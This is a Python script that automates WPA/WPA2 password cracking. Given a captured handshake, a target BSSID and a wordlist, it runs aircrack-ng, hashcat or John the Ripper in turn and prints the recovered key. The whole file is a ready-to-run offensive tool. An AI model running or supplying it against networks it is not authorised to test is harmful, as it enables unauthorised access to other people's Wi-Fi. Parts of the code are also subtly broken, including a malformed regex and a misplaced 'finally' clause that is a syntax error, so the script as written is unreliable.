import os
import re
import sys
import shutil
import subprocess

# 1) Verify presence of external tools
AVAILABLE_TOOLS = {
    'aircrack-ng': shutil.which('aircrack-ng'),
    'hashcat': shutil.which('hashcat'),
    'john': shutil.which('john'),
}
# Filter to those actually installed
TOOLS = {name: path for name, path in AVAILABLE_TOOLS.items() if path}
if not TOOLS:
    print("[!] No supported cracking tools found. Install aircrack-ng, hashcat, or john.")
    sys.exit(1)

def validate_wordlist(path):
    if not os.path.isfile(path) or not os.access(path, os.R_OK):
        print(f"[!] Wordlist file is not accessible: {path}")
        sys.exit(1)

def validate_capture(path):
    if not os.path.isfile(path) or not os.access(path, os.R_OK):
        print(f"[!] Capture file is not accessible: {path}")
        sys.exit(1)

def validate_bssid(bssid):
    if not re.match(r'^[0-9A-Fa-f:]{17}$', bssid):
        print(f"[!] Invalid BSSID format: {bssid}")
        sys.exit(1)

def run_aircrack(wordlist, capture, bssid, timeout=None):
    """Run aircrack-ng and return the cracked key or None."""
    cmd = [
        'aircrack-ng',
        '-w', wordlist,
        '-b', bssid,
        '--show',
        capture
    ]
    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True, timeout=timeout)
        # aircrack-ng --show prints "KEY FOUND! [ password ]"
        for line in result.stdout.splitlines():
            m = re.search(r'([^]+)', line)
            if m:
                return m.group(1)
    except subprocess.TimeoutExpired:
        print("[!] aircrack-ng timed out")
    except subprocess.CalledProcessError as e:
        print(f"[!] aircrack-ng failed (exit {e.returncode})")
    return None

def run_hashcat(wordlist, capture, bssid, timeout=None):
    """Run hashcat in potfile-less mode and return the cracked key or None."""
    # Convert pcap to hccapx first
    hccapx = capture.replace('.cap', '.hccapx')
    try:
        subprocess.run(['aircrack-ng', '-J', hccapx.replace('.hccapx',''), capture],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        print("[!] Failed to convert pcap to hccapx for hashcat")
        return None

    cmd = [
        'hashcat',
        '-m', '2500',            # WPA/WPA2
        '--potfile-disable',     # avoid global potfile
        hccapx,
        wordlist,
        '--quiet'
    ]
    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True, timeout=timeout)
        # parse potfile output in stdout
        for line in result.stdout.splitlines():
            if ':' in line:
                # format: bssid:password
                parts = line.strip().split(':', 1)
                if len(parts) == 2:
                    return parts[1]
    except subprocess.TimeoutExpired:
        print("[!] hashcat timed out")
    except subprocess.CalledProcessError:
        print("[!] hashcat failed")
    return None

def run_john(wordlist, capture, bssid, timeout=None):
    """Run john the ripper in single-session mode and return the cracked key or None."""
    # Convert pcap to hash format via cap2john
    try:
        cap2john = subprocess.run(['cap2john', capture],
                                  check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError:
        print("[!] cap2john failed")
        return None

    # Write hash to temp file
    import tempfile
    tmp = tempfile.NamedTemporaryFile(prefix='minigotchi_john_', delete=False)
    tmp.write(cap2john.stdout.encode())
    tmp.flush()
    tmp.close()
    hashfile = tmp.name

    cmd = ['john', '--wordlist=' + wordlist, '--pot=none', hashfile]
    try:
        subprocess.run(cmd, check=True, timeout=timeout)
        # Fetch result
        show = subprocess.run(['john', '--show', hashfile],
                              check=True, capture_output=True, text=True)
        for line in show.stdout.splitlines():
            if ':' in line:
                return line.split(':', 1)[1].strip()
    except subprocess.TimeoutExpired:
        print("[!] john timed out")
    except subprocess.CalledProcessError:
        print("[!] john failed")
    return None
    finally:
        try:
            os.remove(hashfile)
        except OSError:
            pass

def brute_force(capture, bssid, wordlist, tool_preference=None, timeout=None):
    """
    Attempt to crack the WPA handshake using the preferred tool or fallback order.
    Returns the cracked key or raises SystemExit on fatal error.
    """
    validate_bssid(bssid)
    validate_capture(capture)
    validate_wordlist(wordlist)

    # Determine tool order
    order = [tool_preference] if tool_preference in TOOLS else list(TOOLS.keys())
    for tool in order:
        print(f"[+] Trying with {tool}...")
        cracker = globals()[f'run_{tool.replace("-", "_")}']
        key = cracker(wordlist, capture, bssid, timeout=timeout)
        if key:
            print(f"[+] Password cracked with {tool}: {key}")
            return key
        else:
            print(f"[-] {tool} did not crack the password.")
    print("[!] All tools failed to crack the password.")
    sys.exit(1)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="Perform WPA dictionary attack")
    parser.add_argument('capture', help="Path to handshake capture file (.cap)")
    parser.add_argument('bssid', help="Target AP BSSID")
    parser.add_argument('wordlist', help="Path to wordlist file")
    parser.add_argument('--tool', choices=list(TOOLS.keys()),
                        help="Preferred cracking tool")
    parser.add_argument('--timeout', type=int, help="Timeout in seconds")
    args = parser.parse_args()

    brute_force(args.capture, args.bssid, args.wordlist,
                tool_preference=args.tool, timeout=args.timeout)